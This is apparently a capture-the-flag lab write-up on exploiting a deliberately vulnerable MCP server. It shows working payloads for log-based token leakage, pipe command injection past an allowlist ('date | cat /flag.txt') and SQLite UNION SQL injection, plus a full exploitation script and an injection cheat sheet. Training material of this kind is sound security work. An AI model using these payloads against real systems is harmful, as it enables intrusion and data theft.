---
tags: [lab, attack/ai]
module: attacking_ai_applications_and_systems
last_updated: 2026-05-13
source_count: 1
---

# Vulnerable MCP Servers — Lab Write-ups

Three progressive exploitation exercises against a vulnerable MCP server: information disclosure via log leakage, command injection through an allowlist bypass, and SQL injection via a resource template parameter.

## Target

| Field | Value |
|-------|-------|
| Target | MCP server (Streamable HTTP transport) |
| Endpoint | `http://STMIP:STMPO/mcp/` |
| Client library | `fastmcp` |
| Difficulty | Medium |

---

## Setup

Install the MCP client library:

```bash
pip3 install fastmcp
```

The base enumeration script lists all capabilities — run this first against every MCP target to map the attack surface:

```python
import asyncio
from fastmcp import Client

client = Client("http://STMIP:STMPO/mcp/")

async def main():
    async with client:
        resources          = await client.list_resources()
        resource_templates = await client.list_resource_templates()
        tools              = await client.list_tools()

        print("Resources:")
        for r in resources:
            print(f"  *** {r.name}\n  {r.description.strip()}")

        print("\nResource Templates:")
        for rt in resource_templates:
            print(f"  *** {rt.uriTemplate}\n  {rt.description.strip()}")

        print("\nTools:")
        for t in tools:
            params = list(t.inputSchema.get('properties').keys())
            print(f"  *** {t.name}({', '.join(params)})\n  {t.description.strip()}")

asyncio.run(main())
```

**Output from the target:**

```
Resources:
  *** get_logs       — Provide the MCP server logs.
  *** get_items      — Fetch all available items.

Resource Templates:
  *** quantity://{item}   — Fetch item quantity from quantity API.
  *** price://{item}      — Fetch item price from price API.

Tools:
  *** execute_server_command(command)
      Execute a safe command on the server.
      command -- the command to execute (one of 'date', 'whoami', 'uptime')
  *** fetch_price_data(url)
      Fetch price data from an external URL.
      url -- the url to fetch data from.
```

All three vulnerabilities are visible in this output if you know what to look for:
- `get_logs` — server logs may contain sensitive data (credentials, tokens)
- `execute_server_command` with an "allowlist" — allowlist enforcement is worth testing for bypass
- `price://{item}` — user-controlled string passed to a resource template → SQLi candidate

---

## Question 1: Information Disclosure via Server Logs

**Objective:** Exploit an information disclosure vulnerability to obtain the flag.

### Discovery

The `get_logs` resource exposes server-side logs directly to any connected client. Server logs frequently contain:
- Internal API call details (URLs, headers, auth tokens)
- Errors revealing internal paths and service names
- Credentials or tokens passed in HTTP headers

Before reading the logs, trigger a resource template call to generate a new log entry — this forces the server to make a backend API call, which will be logged with full request details including any `Authorization` headers:

```python
try:
    result = await client.read_resource("quantity://banana")
    print(result[0].text)
except Exception as e:
    print(f"[-] {e}")   # expect an error — the point is to trigger the log entry
```

### Exploitation

Now read the logs:

```python
try:
    result = await client.read_resource("resource://logs")
    print(result[0].text)
except Exception as e:
    print(f"[-] {e}")
```

The log output includes the failed quantity API request with the full HTTP request details:

```
2025-08-27 11:39:01.747139: Error fetching item quantity. Requests details:
  'http://localhost/api/item/banana'
  {'Content-Type': 'application/json', 'User-Agent': 'MCP Server 1.0.0',
   'Authorization': 'Bearer HTB{cc96abbeb907869ead497097395b6847}'}
```

The Bearer token in the `Authorization` header is the flag — leaked because the server logged its own internal API credentials at debug level and exposed those logs without access control.

**Flag 1:** `HTB{cc96abbeb907869ead497097395b6847}`

---

## Question 2: Command Injection via execute_server_command

**Objective:** Exploit an RCE vulnerability to obtain the flag.

### Discovery

The tool description states: `command -- the command to execute (one of 'date', 'whoami', 'uptime')`. This claims an allowlist, but the description is documentation — it does not tell us how enforcement is implemented.

**Always test allowlist claims.** Two common weak implementations:
1. The server checks `if command in ['date', 'whoami', 'uptime']` and passes the value to `subprocess.run(command, shell=True)` — **pipe injection works**
2. The server runs the command as-is with `shell=True` without any check — **full injection**

Start by confirming a legitimate command works:

```python
try:
    result = await client.call_tool("execute_server_command", {"command": "date"})
    print(result.content[0].text)
except Exception as e:
    print(f"[-] {e}")
```

Output: `Wed Aug 27 11:46:06 UTC 2025` — command executed successfully.

### Exploitation

Test pipe injection. The pipe character (`|`) causes a shell to execute everything after it as a new command, regardless of what came before:

```python
try:
    result = await client.call_tool("execute_server_command", {"command": "date | ls /"})
    print(result.content[0].text)
except Exception as e:
    print(f"[-] {e}")
```

Output includes a directory listing of `/`:

```
app  bin  dev  etc  flag.txt  home  lib  media  ...
```

The pipe injection succeeded. The server passes the full value string to a shell, and `date | ls /` is interpreted as "run date, pipe its output to ls /". The allowlist check (if present) matched on "date" as a prefix — not the full value.

Read the flag:

```python
try:
    result = await client.call_tool("execute_server_command", {"command": "date | cat /flag.txt"})
    print(result.content[0].text)
except Exception as e:
    print(f"[-] {e}")
```

**Flag 2:** `HTB{3ce4398435525feb01b10d9a673203ed}`

---

## Question 3: SQL Injection via price://{item} Resource Template

**Objective:** Exploit an SQL injection vulnerability to obtain the flag.

### Discovery

The `price://{item}` resource template passes the `{item}` value to a backend price lookup. String values interpolated into database queries without parameterization are classic SQLi entry points.

Test with a single quote to probe for SQL errors:

```python
try:
    result = await client.read_resource("price://banana'")
    print(result[0].text)
except Exception as e:
    print(f"[-] {e}")
```

Output: `[-] Error reading resource from template "price://banana'": Price API Error`

The error is different from a normal "not found" response — the server returned a generic error when the quote broke the SQL syntax. This confirms the injection point.

### Step 1: Determine Column Count (UNION SELECT)

Use URL encoding for special characters in resource URIs:

```python
# UNION SELECT 1 — test with a single column
result = await client.read_resource("price://x'%20UNION%20SELECT%201--")
```

Output: `1` — the query succeeded and returned our injected value. One column confirmed.

### Step 2: Fingerprint the Database Engine

```python
# UNION SELECT sqlite_version()
result = await client.read_resource("price://x'%20UNION%20SELECT%20sqlite_version%28%29--")
```

Output: `3.49.2` — this is SQLite (note: the Skills Assessment uses MariaDB; this target uses SQLite — different syntax for schema enumeration).

### Step 3: Enumerate Tables

SQLite uses `sqlite_master` instead of `information_schema`:

```python
# UNION SELECT group_concat(name) FROM sqlite_master
result = await client.read_resource("price://x'UNION%20SELECT%20group_concat%28name%29%20FROM%20sqlite_master--")
```

Output: `items,flag` — a `flag` table exists.

### Step 4: Enumerate Columns in the flag Table

SQLite uses `pragma_table_info()` instead of `information_schema.columns`:

```python
# UNION SELECT group_concat(name || ':' || type) FROM pragma_table_info('flag')
result = await client.read_resource("price://x'UNION%20SELECT%20group_concat%28name%20%7C%7C%20%27%3A%27%20%7C%7C%20type%29%20FROM%20pragma_table_info%28%27flag%27%29--")
```

Output: `ID:INTEGER,flag:INTEGER`

### Step 5: Extract the Flag

```python
# UNION SELECT flag FROM flag
result = await client.read_resource("price://x'%20UNION%20SELECT%20flag%20FROM%20flag--")
```

**Flag 3:** `HTB{423c987f7626cb903a023b900b79bf15}`

---

## Complete Exploitation Script

```python
import asyncio
from fastmcp import Client

client = Client("http://STMIP:STMPO/mcp/")

async def main():
    async with client:

        # Q1 — Information disclosure: trigger a log entry then read logs
        try:
            await client.read_resource("quantity://banana")
        except:
            pass
        try:
            logs = await client.read_resource("resource://logs")
            print("[Q1] Logs:", logs[0].text)
        except Exception as e:
            print(f"[-] Q1 error: {e}")

        # Q2 — Command injection via pipe
        try:
            result = await client.call_tool("execute_server_command", {"command": "date | cat /flag.txt"})
            print("[Q2] Flag:", result.content[0].text)
        except Exception as e:
            print(f"[-] Q2 error: {e}")

        # Q3 — SQLi: enumerate and dump flag table (SQLite)
        try:
            result = await client.read_resource("price://x'%20UNION%20SELECT%20flag%20FROM%20flag--")
            print("[Q3] Flag:", result[0].text)
        except Exception as e:
            print(f"[-] Q3 error: {e}")

asyncio.run(main())
```

---

## SQLite vs MariaDB Cheat Sheet for MCP SQLi

| Operation | SQLite syntax | MariaDB syntax |
|-----------|--------------|---------------|
| Version | `sqlite_version()` | `@@version` |
| List tables | `SELECT name FROM sqlite_master` | `SELECT table_name FROM information_schema.tables WHERE table_schema=database()` |
| List columns | `SELECT name FROM pragma_table_info('tablename')` | `SELECT column_name FROM information_schema.columns WHERE table_name='tablename'` |
| Concat results | `group_concat(col)` | `GROUP_CONCAT(col)` |
| Comment | `--` | `-- -` or `#` |

---

## Lessons Learned

- **MCP server logs are a common credential/token leak source.** Servers that log backend API calls often include `Authorization` headers in debug output. If `get_logs` is exposed without authentication, check for auth tokens immediately.
- **Allowlist descriptions in tool schemas are documentation, not enforcement.** Always test claimed restrictions with boundary values and injection characters.
- **Pipe injection (`|`) bypasses prefix-match allowlists.** If the server checks `command.startswith('date')` before calling `subprocess.run(command, shell=True)`, `date | id` passes the check and executes `id`.
- **MCP resource templates pass user-controlled values to backends.** Any template like `price://{item}` where `{item}` is unsanitized before a database query is an SQLi vector. URL-encode special characters when the URI has encoding requirements.

---

## Related Pages

- [[enumeration/mcp_servers]] — MCP server reconnaissance and capability enumeration
- [[attack/ai/mcp_security]] — MCP threat model, tool poisoning, malicious server patterns
- [[protocols/mcp]] — MCP protocol reference: resources, tools, resource templates
- [[attack/sql_databases]] — SQL injection reference for non-MCP contexts
- [[definitions/owasp_llm_top10]] — LLM09 (Misinformation / downstream injection)

## Sources

- raw/lab/attacking_ai_applications_and_systems/vulnerable_mcp_servers.md
